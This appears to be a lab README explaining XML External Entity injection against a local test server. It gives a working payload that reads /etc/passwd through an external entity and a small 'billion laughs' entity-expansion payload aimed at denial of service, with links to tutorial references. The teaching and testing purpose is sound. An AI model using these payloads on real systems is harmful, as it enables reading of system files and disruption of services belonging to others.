# Vulnerability XML External Entity Injection 

This vulnerability allows an attacker to intercept data through XML. 
It is possible to read files *by manipulating new entities*. 
In some cases, attackers can escalate or compromise the backend, such as *accessing confidential information* or even changing data in the system.
Make theserver insecure and allowing the attacker to make requests *without traceability*.

Why this happen? Because the server isn't validating the content of XML.

## Scenario 1: XXE

## How to execute

1. Run the server;
2. Testing XML parser

```xml
<?xml version="1.0" encoding="UTF-8"?>
<library>
    <book>
        <title>The Great Gatsby</title>
        <author>F. Scott Fitzgerald</author>
        <year>1925</year>
        <genre>Fiction</genre>
    </book>
 </library>
 ```
 

3. Transforming the content for a new entity "System" with it's external, adding the root and replacing by "example" wih an internal object.

```xml
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```

## Scenario 2 (XXE): Billion Laugh Attack

 It occurs when the xml parser continually expands each entity within itself, which overloads the server and results in denial of service.

## How to execute

1. Insert the input

```xml
<!DOCTYPE data [
<!ENTITY a0 "vulnerabilidade" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">]>
<data>&a1;</data>
 ```

## References

https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity

https://portswigger.net/web-security/xxe

https://portswigger.net/web-security/ssrf

https://bugbase.ai/blog/demystifying-xxe-injection